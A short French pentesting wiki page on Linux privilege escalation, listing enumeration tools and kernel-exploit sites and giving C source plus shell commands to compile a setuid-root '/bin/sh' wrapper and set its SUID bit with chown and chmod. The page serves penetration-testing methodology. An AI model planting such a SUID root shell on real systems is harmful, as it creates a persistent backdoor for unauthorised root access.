---
title: Elevation de priviléges (Linux)
permalink: /Elevation_de_priviléges_(Linux)/
---

Enumération
-----------

Cette étape consiste à rassembler des informations pour élever ses privilèges. Il peut être utilise d'utiliser le script [LinuxPrivChecker](http://www.securitysift.com/download/linuxprivchecker.py) pour récupérer automatiquement les informations utiles.

### Exploits Kernels

En fonction de la version du Kernel utilisé, le site <https://www.kernel-exploits.com/> recense des exploits kernels pour différentes versions de Linux.

Shell Root
----------

Si on peut executer des commandes en tant que root, mais que l'on a pas encore un "vrai" shell root, il peut être utile de compiler un programme permettant de lancer un shell et lui mettre le bit suid.

``` c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main()
{
    setuid(0);
    system("/bin/sh");
    return 0;
}
```

Dans un premier temps on créer le fichier permettra d'avoir un shell root:

``` bash
echo "#include <stdlib.h>"> main.c
echo "#include <stdio.h>">> main.c
echo "#include <unistd.h>">> main.c
echo "#include <sys/types.h>">> main.c
echo 'int main(){setuid(0);system("/bin/sh");return 0;}'>> main.c
```

Ensuite on le compile:

``` bash
gcc main.c -o suid
```

Ces deux étapes peuvent se faire sur une autre machine (notamment si gcc n'est pas présent). Ensuite il est nécessaire d’exécuter les commandes suivantes en tant que root:

``` bash
chown root:root suid
chmod ugo+s suid
```

Resources
---------

-   [G0tmi1k Blog](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
-   [Linux Exploit Suggester](https://github.com/PenturaLabs/Linux_Exploit_Suggester)
-   [PentestMonky unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)
-   [LinuxPrivChecker](http://www.securitysift.com/download/linuxprivchecker.py)
-   [Kernel-Exploits](https://www.kernel-exploits.com/)
-   [Its Too Funky In Here04 Linux privilege escalation for fun profit and all around mischief](https://www.youtube.com/watch?v=dk2wsyFiosg)

[Category:Méthodologies](/Category:Méthodologies "wikilink")